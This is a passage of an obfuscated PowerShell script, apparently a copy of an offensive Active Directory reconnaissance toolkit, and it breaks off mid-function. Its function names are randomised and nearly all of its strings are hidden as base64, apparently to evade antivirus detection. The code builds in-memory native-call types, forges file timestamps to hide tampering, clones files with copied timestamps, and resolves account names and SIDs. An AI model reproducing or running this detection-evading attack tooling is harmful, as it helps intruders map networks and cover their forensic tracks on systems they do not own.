function SolvertSeedismPremands
{
    Param
    (
        [Parameter(Position = 0)]
        [ValidateNotNullOrEmpty()]
        [String]
        $ModuleName = [Guid]::NewGuid().ToString()
    )
    $LoadedAssemblies = [AppDomain]::CurrentDomain.GetAssemblies()
    ForEach ($Assembly in $LoadedAssemblies) {
        if ($Assembly.FullName -and ($Assembly.FullName.Split(',')[0] -eq $ModuleName)) {
            return $Assembly
        }
    }
    $DynAssembly = New-Object Reflection.AssemblyName($ModuleName)
    $Domain = [AppDomain]::CurrentDomain
    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgB1AG4A'))))
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule($ModuleName, $False)
    return $ModuleBuilder
}
function PressJizygodaeMily
{
    Param
    (
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $DllName,
        [Parameter(Position = 1, Mandatory = $True)]
        [String]
        $FunctionName,
        [Parameter(Position = 2, Mandatory = $True)]
        [Type]
        $ReturnType,
        [Parameter(Position = 3)]
        [Type[]]
        $ParameterTypes,
        [Parameter(Position = 4)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention,
        [Parameter(Position = 5)]
        [Runtime.InteropServices.CharSet]
        $Charset,
        [Switch]
        $SetLastError
    )
    $Properties = @{
        DllName = $DllName
        FunctionName = $FunctionName
        ReturnType = $ReturnType
    }
    if ($ParameterTypes) { $Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHIAYQBtAGUAdABlAHIAVAB5AHAAZQBzAA==')))] = $ParameterTypes }
    if ($NativeCallingConvention) { $Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBhAHQAaQB2AGUAQwBhAGwAbABpAG4AZwBDAG8AbgB2AGUAbgB0AGkAbwBuAA==')))] = $NativeCallingConvention }
    if ($Charset) { $Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGEAcgBzAGUAdAA=')))] = $Charset }
    if ($SetLastError) { $Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHQATABhAHMAdABFAHIAcgBvAHIA')))] = $SetLastError }
    New-Object PSObject -Property $Properties
}
function KazalOxyReploids
{
    [OutputType([Hashtable])]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [String]
        $DllName,
        [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [String]
        $FunctionName,
        [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [Type]
        $ReturnType,
        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [Type[]]
        $ParameterTypes,
        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention = [Runtime.InteropServices.CallingConvention]::StdCall,
        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [Runtime.InteropServices.CharSet]
        $Charset = [Runtime.InteropServices.CharSet]::Auto,
        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [Switch]
        $SetLastError,
        [Parameter(Mandatory = $True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,
        [ValidateNotNull()]
        [String]
        $Namespace = ''
    )
    BEGIN
    {
        $TypeHash = @{}
    }
    PROCESS
    {
        if ($Module -is [Reflection.Assembly])
        {
            if ($Namespace)
            {
                $TypeHash[$DllName] = $Module.GetType($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABOAGEAbQBlAHMAcABhAGMAZQAuACQARABsAGwATgBhAG0AZQA='))))
            }
            else
            {
                $TypeHash[$DllName] = $Module.GetType($DllName)
            }
        }
        else
        {
            if (!$TypeHash.ContainsKey($DllName))
            {
                if ($Namespace)
                {
                    $TypeHash[$DllName] = $Module.DefineType($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABOAGEAbQBlAHMAcABhAGMAZQAuACQARABsAGwATgBhAG0AZQA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA='))))
                }
                else
                {
                    $TypeHash[$DllName] = $Module.DefineType($DllName, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA='))))
                }
            }
            $Method = $TypeHash[$DllName].DefineMethod(
                $FunctionName,
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAsAFAAaQBuAHYAbwBrAGUASQBtAHAAbAA='))),
                $ReturnType,
                $ParameterTypes)
            $i = 1
            ForEach($Parameter in $ParameterTypes)
            {
                if ($Parameter.IsByRef)
                {
                    [void] $Method.DefineParameter($i, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB1AHQA'))), $Null)
                }
                $i++
            }
            $DllImport = [Runtime.InteropServices.DllImportAttribute]
            $SetLastErrorField = $DllImport.GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHQATABhAHMAdABFAHIAcgBvAHIA'))))
            $CallingConventionField = $DllImport.GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbABpAG4AZwBDAG8AbgB2AGUAbgB0AGkAbwBuAA=='))))
            $CharsetField = $DllImport.GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGEAcgBTAGUAdAA='))))
            if ($SetLastError) { $SLEValue = $True } else { $SLEValue = $False }
            $Constructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor([String])
            $DllImportAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($Constructor,
                $DllName, [Reflection.PropertyInfo[]] @(), [Object[]] @(),
                [Reflection.FieldInfo[]] @($SetLastErrorField, $CallingConventionField, $CharsetField),
                [Object[]] @($SLEValue, ([Runtime.InteropServices.CallingConvention] $NativeCallingConvention), ([Runtime.InteropServices.CharSet] $Charset)))
            $Method.SetCustomAttribute($DllImportAttribute)
        }
    }
    END
    {
        if ($Module -is [Reflection.Assembly])
        {
            return $TypeHash
        }
        $ReturnTypes = @{}
        ForEach ($Key in $TypeHash.Keys)
        {
            $Type = $TypeHash[$Key].CreateType()
            $ReturnTypes[$Key] = $Type
        }
        return $ReturnTypes
    }
}
function PsyhedTristicFascopy
{
    [OutputType([Type])]
    Param
    (
        [Parameter(Position = 0, Mandatory = $True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,
        [Parameter(Position = 1, Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $FullName,
        [Parameter(Position = 2, Mandatory = $True)]
        [Type]
        $Type,
        [Parameter(Position = 3, Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $EnumElements,
        [Switch]
        $Bitfield
    )
    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($FullName))
    }
    $EnumType = $Type -as [Type]
    $EnumBuilder = $Module.DefineEnum($FullName, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))), $EnumType)
    if ($Bitfield)
    {
        $FlagsConstructor = [FlagsAttribute].GetConstructor(@())
        $FlagsCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($FlagsConstructor, @())
        $EnumBuilder.SetCustomAttribute($FlagsCustomAttribute)
    }
    ForEach ($Key in $EnumElements.Keys)
    {
        $Null = $EnumBuilder.DefineLiteral($Key, $EnumElements[$Key] -as $EnumType)
    }
    $EnumBuilder.CreateType()
}
function SoolhookUnadmitePneated
{
    Param
    (
        [Parameter(Position = 0, Mandatory = $True)]
        [UInt16]
        $Position,
        [Parameter(Position = 1, Mandatory = $True)]
        [Type]
        $Type,
        [Parameter(Position = 2)]
        [UInt16]
        $Offset,
        [Object[]]
        $MarshalAs
    )
    @{
        Position = $Position
        Type = $Type -as [Type]
        Offset = $Offset
        MarshalAs = $MarshalAs
    }
}
function VationChilimaliTendylike
{
    [OutputType([Type])]
    Param
    (
        [Parameter(Position = 1, Mandatory = $True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,
        [Parameter(Position = 2, Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $FullName,
        [Parameter(Position = 3, Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $StructFields,
        [Reflection.Emit.PackingSize]
        $PackingSize = [Reflection.Emit.PackingSize]::Unspecified,
        [Switch]
        $ExplicitLayout
    )
    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($FullName))
    }
    [Reflection.TypeAttributes] $StructAttributes = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBuAHMAaQBDAGwAYQBzAHMALAAKACAAIAAgACAAIAAgACAAIABDAGwAYQBzAHMALAAKACAAIAAgACAAIAAgACAAIABQAHUAYgBsAGkAYwAsAAoAIAAgACAAIAAgACAAIAAgAFMAZQBhAGwAZQBkACwACgAgACAAIAAgACAAIAAgACAAQgBlAGYAbwByAGUARgBpAGUAbABkAEkAbgBpAHQA')))
    if ($ExplicitLayout)
    {
        $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::ExplicitLayout
    }
    else
    {
        $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::SequentialLayout
    }
    $StructBuilder = $Module.DefineType($FullName, $StructAttributes, [ValueType], $PackingSize)
    $ConstructorInfo = [Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
    $SizeConst = @([Runtime.InteropServices.MarshalAsAttribute].GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBDAG8AbgBzAHQA')))))
    $Fields = New-Object Hashtable[]($StructFields.Count)
    ForEach ($Field in $StructFields.Keys)
    {
        $Index = $StructFields[$Field][$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHMAaQB0AGkAbwBuAA==')))]
        $Fields[$Index] = @{FieldName = $Field; Properties = $StructFields[$Field]}
    }
    ForEach ($Field in $Fields)
    {
        $FieldName = $Field[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGUAbABkAE4AYQBtAGUA')))]
        $FieldProp = $Field[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]
        $Offset = $FieldProp[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBmAGYAcwBlAHQA')))]
        $Type = $FieldProp[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAB5AHAAZQA=')))]
        $MarshalAs = $FieldProp[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHIAcwBoAGEAbABBAHMA')))]
        $NewField = $StructBuilder.DefineField($FieldName, $Type, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))
        if ($MarshalAs)
        {
            $UnmanagedType = $MarshalAs[0] -as ([Runtime.InteropServices.UnmanagedType])
            if ($MarshalAs[1])
            {
                $Size = $MarshalAs[1]
                $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo,
                    $UnmanagedType, $SizeConst, @($Size))
            }
            else
            {
                $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, [Object[]] @($UnmanagedType))
            }
            $NewField.SetCustomAttribute($AttribBuilder)
        }
        if ($ExplicitLayout) { $NewField.SetOffset($Offset) }
    }
    $SizeMethod = $StructBuilder.DefineMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAUwBpAHoAZQA='))),
        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALAAgAFMAdABhAHQAaQBjAA=='))),
        [Int],
        [Type[]] @())
    $ILGenerator = $SizeMethod.GetILGenerator()
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAVAB5AHAAZQBGAHIAbwBtAEgAYQBuAGQAbABlAA==')))))
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYA'))), [Type[]] @([Type])))
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ret)
    $ImplicitConverter = $StructBuilder.DefineMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBwAF8ASQBtAHAAbABpAGMAaQB0AA=='))),
        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAdgBhAHQAZQBTAGMAbwBwAGUALAAgAFAAdQBiAGwAaQBjACwAIABTAHQAYQB0AGkAYwAsACAASABpAGQAZQBCAHkAUwBpAGcALAAgAFMAcABlAGMAaQBhAGwATgBhAG0AZQA='))),
        $StructBuilder,
        [Type[]] @([IntPtr]))
    $ILGenerator2 = $ImplicitConverter.GetILGenerator()
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Nop)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldarg_0)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAVAB5AHAAZQBGAHIAbwBtAEgAYQBuAGQAbABlAA==')))))
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB0AHIAVABvAFMAdAByAHUAYwB0AHUAcgBlAA=='))), [Type[]] @([IntPtr], [Type])))
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Unbox_Any, $StructBuilder)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ret)
    $StructBuilder.CreateType()
}
function PreenicCualiaQuinome {
    Param(
        [Parameter(Mandatory=$True, ValueFromPipeline=$True,
        ValueFromPipelineByPropertyName=$True)]
        [System.Management.Automation.PSObject]
        $InputObject,
        [Parameter(Mandatory=$True, Position=0)]
        [Alias('PSPath')]
        [String]
        $OutFile
    )
    process {
        $ObjectCSV = $InputObject | ConvertTo-Csv -NoTypeInformation
        $Mutex = New-Object System.Threading.Mutex $False,$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBTAFYATQB1AHQAZQB4AA==')));
        $Null = $Mutex.WaitOne()
        if (Test-Path -Path $OutFile) {
            $ObjectCSV | Foreach-Object {$Start=$True}{if ($Start) {$Start=$False} else {$_}} | Out-File -Encoding $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBTAEMASQBJAA=='))) -Append -FilePath $OutFile
        }
        else {
            $ObjectCSV | Out-File -Encoding $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBTAEMASQBJAA=='))) -Append -FilePath $OutFile
        }
        $Mutex.ReleaseMutex()
    }
}
function DownDecaticanChingion {
    [CmdletBinding(DefaultParameterSetName = 'Touch')]
    Param (
        [Parameter(Position = 1,Mandatory = $True)]
        [ValidateScript({Test-Path -Path $_ })]
        [String]
        $FilePath,
        [Parameter(ParameterSetName = 'Touch')]
        [ValidateScript({Test-Path -Path $_ })]
        [String]
        $OldFilePath,
        [Parameter(ParameterSetName = 'Individual')]
        [DateTime]
        $Modified,
        [Parameter(ParameterSetName = 'Individual')]
        [DateTime]
        $Accessed,
        [Parameter(ParameterSetName = 'Individual')]
        [DateTime]
        $Created,
        [Parameter(ParameterSetName = 'All')]
        [DateTime]
        $AllMacAttributes
    )
    function TubbiningWarryFless {
        param($OldFileName)
        if (!(Test-Path -Path $OldFileName)) {Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQAgAE4AbwB0ACAARgBvAHUAbgBkAA==')))}
        $FileInfoObject = (gi $OldFileName)
        $ObjectProperties = @{'Modified' = ($FileInfoObject.LastWriteTime);
                              'Accessed' = ($FileInfoObject.LastAccessTime);
                              'Created' = ($FileInfoObject.CreationTime)};
        $ResultObject = New-Object -TypeName PSObject -Property $ObjectProperties
        Return $ResultObject
    }
    $FileInfoObject = (gi -Path $FilePath)
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwATQBhAGMAQQB0AHQAcgBpAGIAdQB0AGUAcwA=')))]) {
        $Modified = $AllMacAttributes
        $Accessed = $AllMacAttributes
        $Created = $AllMacAttributes
    }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBsAGQARgBpAGwAZQBQAGEAdABoAA==')))]) {
        $CopyFileMac = (TubbiningWarryFless $OldFilePath)
        $Modified = $CopyFileMac.Modified
        $Accessed = $CopyFileMac.Accessed
        $Created = $CopyFileMac.Created
    }
    if ($Modified) {$FileInfoObject.LastWriteTime = $Modified}
    if ($Accessed) {$FileInfoObject.LastAccessTime = $Accessed}
    if ($Created) {$FileInfoObject.CreationTime = $Created}
    Return (TubbiningWarryFless $FilePath)
}
function NoneysWobenditoPhal {
    param(
        [Parameter(Mandatory = $True)]
        [String]
        [ValidateNotNullOrEmpty()]
        $SourceFile,
        [Parameter(Mandatory = $True)]
        [String]
        [ValidateNotNullOrEmpty()]
        $DestFile
    )
    DownDecaticanChingion -FilePath $SourceFile -OldFilePath $DestFile
    cp -Path $SourceFile -Destination $DestFile
}
function OfficentRemnifiedCompline {
    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [Alias('HostName')]
        [String]
        $ComputerName = ''
    )
    process {
        try {
            $Results = @(([Net.Dns]::GetHostEntry($ComputerName)).AddressList)
            if ($Results.Count -ne 0) {
                ForEach ($Result in $Results) {
                    if ($Result.AddressFamily -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHQAZQByAE4AZQB0AHcAbwByAGsA')))) {
                        $Result.IPAddressToString
                    }
                }
            }
        }
        catch {
            Write-Verbose -Message $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHUAbABkACAAbgBvAHQAIAByAGUAcwBvAGwAdgBlACAAaABvAHMAdAAgAHQAbwAgAGEAbgAgAEkAUAAgAEEAZABkAHIAZQBzAHMALgA=')))
        }
    }
    end {}
}
function AutUnalPopular {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$True,ValueFromPipeline=$True)]
        [String]
        [Alias('Name')]
        $ObjectName,
        [String]
        $Domain = (PrectusEmbakedTects).Name
    )
    process {
        $ObjectName = $ObjectName -replace "/","\"
        if($ObjectName.contains("\")) {
            $Domain = $ObjectName.split("\")[0]
            $ObjectName = $ObjectName.split("\")[1]
        }
        try {
            $Obj = (New-Object System.Security.Principal.NTAccount($Domain,$ObjectName))
            $Obj.Translate([System.Security.Principal.SecurityIdentifier]).Value
        }
        catch {
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAYQBsAGkAZAAgAG8AYgBqAGUAYwB0AC8AbgBhAG0AZQA6ACAAJABEAG8AbQBhAGkAbgBcACQATwBiAGoAZQBjAHQATgBhAG0AZQA=')))
            $Null
        }
    }
}
function ElminutColatCably {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$True,ValueFromPipeline=$True)]
        [String]
        $SID
    )
    process {
        try {
            $SID2 = $SID.trim('*')
            Switch ($SID2)
            {
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQAwAA==')))         { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AGwAbAAgAEEAdQB0AGgAbwByAGkAdAB5AA=='))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQAwAC0AMAA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAGIAbwBkAHkA'))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQAxAA==')))         { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBvAHIAbABkACAAQQB1AHQAaABvAHIAaQB0AHkA'))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQAxAC0AMAA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB2AGUAcgB5AG8AbgBlAA=='))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQAyAA==')))         { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGMAYQBsACAAQQB1AHQAaABvAHIAaQB0AHkA'))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQAyAC0AMAA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGMAYQBsAA=='))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQAyAC0AMQA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AcwBvAGwAZQAgAEwAbwBnAG8AbgAgAA=='))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQAzAA==')))         { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AG8AcgAgAEEAdQB0AGgAbwByAGkAdAB5AA=='))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQAzAC0AMAA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AG8AcgAgAE8AdwBuAGUAcgA='))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQAzAC0AMQA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AG8AcgAgAEcAcgBvAHUAcAA='))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQAzAC0AMgA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AG8AcgAgAE8AdwBuAGUAcgAgAFMAZQByAHYAZQByAA=='))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQAzAC0AMwA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AG8AcgAgAEcAcgBvAHUAcAAgAFMAZQByAHYAZQByAA=='))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQAzAC0ANAA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB3AG4AZQByACAAUgBpAGcAaAB0AHMA'))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA0AA==')))         { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAG4ALQB1AG4AaQBxAHUAZQAgAEEAdQB0AGgAbwByAGkAdAB5AA=='))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AA==')))         { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUACAAQQB1AHQAaABvAHIAaQB0AHkA'))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMQA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAGEAbAB1AHAA'))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMgA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAHQAdwBvAHIAawA='))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBhAHQAYwBoAA=='))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0ANAA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHQAZQByAGEAYwB0AGkAdgBlAA=='))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0ANgA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQA='))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0ANwA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBuAG8AbgB5AG0AbwB1AHMA'))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AOAA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AeAB5AA=='))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AOQA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBuAHQAZQByAHAAcgBpAHMAZQAgAEQAbwBtAGEAaQBuACAAQwBvAG4AdAByAG8AbABsAGUAcgBzAA=='))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMQAwAA==')))      { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAbgBjAGkAcABhAGwAIABTAGUAbABmAA=='))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMQAxAA==')))      { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABlAG4AdABpAGMAYQB0AGUAZAAgAFUAcwBlAHIAcwA='))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMQAyAA==')))      { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdAByAGkAYwB0AGUAZAAgAEMAbwBkAGUA'))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMQAzAA==')))      { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABlAHIAbQBpAG4AYQBsACAAUwBlAHIAdgBlAHIAIABVAHMAZQByAHMA'))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMQA0AA==')))      { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AbwB0AGUAIABJAG4AdABlAHIAYQBjAHQAaQB2AGUAIABMAG8AZwBvAG4A'))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMQA1AA==')))      { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGkAcwAgAE8AcgBnAGEAbgBpAHoAYQB0AGkAbwBuACAA'))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMQA3AA==')))      { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGkAcwAgAE8AcgBnAGEAbgBpAHoAYQB0AGkAbwBuACAA'))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMQA4AA==')))      { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGMAYQBsACAAUwB5AHMAdABlAG0A'))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMQA5AA==')))      { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUACAAQQB1AHQAaABvAHIAaQB0AHkA'))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMgAwAA==')))      { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUACAAQQB1AHQAaABvAHIAaQB0AHkA'))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AOAAwAC0AMAA=')))    { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwAIABTAGUAcgB2AGkAYwBlAHMAIAA='))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA0ADQA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAEEAZABtAGkAbgBpAHMAdAByAGEAdABvAHIAcwA='))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA0ADUA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFUAcwBlAHIAcwA='))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA0ADYA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAEcAdQBlAHMAdABzAA=='))) }
